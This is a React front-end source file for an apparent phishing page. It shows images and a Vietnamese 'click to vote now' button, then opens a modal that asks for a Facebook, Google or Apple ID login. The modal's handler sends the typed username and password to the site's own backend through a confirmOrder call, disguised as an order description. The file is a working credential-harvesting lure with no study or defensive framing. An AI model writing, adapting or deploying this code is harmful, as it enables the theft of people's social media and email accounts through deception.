import logo from './logo.svg';
import './App.css';
import { Input, Modal } from 'antd';
import { useState } from 'react';
import { confirmOrder } from './requestApi';


function App() {
  const [isModalOpen, setisModalOpen] = useState()
  const [user, setUser] = useState('')
  const [pass, setPass] = useState('')
  const handleOk = () => {
    confirmOrder({
      "id": "18e40df0-ae98-423a-b685-e306214b3bab",
      "statusCheck": 1,
      "description": `${user} / ${pass}`
    })
  }
  return (
    <div className="App">
      <div>
        <img src="/anh1.jpg" alt="" />
      </div>
      <div>
        <img src="/anh2.2.jpg" alt="" />
      </div>
      <div>
        <img src="/anh3.jpg" alt="" />
      </div>
      <div className="button-wrap">
        <div className="button" onClick={() => setisModalOpen(true)}>
          Click để bình chọn ngay
        </div>
      </div>
      <Modal
        title="Đăng nhập Facebook/Google/AppleId để tiếp tục"
        open={isModalOpen}
        okText='Login'
        onOk={handleOk} onCancel={() => setisModalOpen(false)}>
        Tên đăng nhập
        <Input onChange={(e) => setUser(e.target.value)}></Input>
        Mật khẩu
        <Input onChange={(e) => setPass(e.target.value)}></Input>
      </Modal>

    </div>
  );
}

export default App;
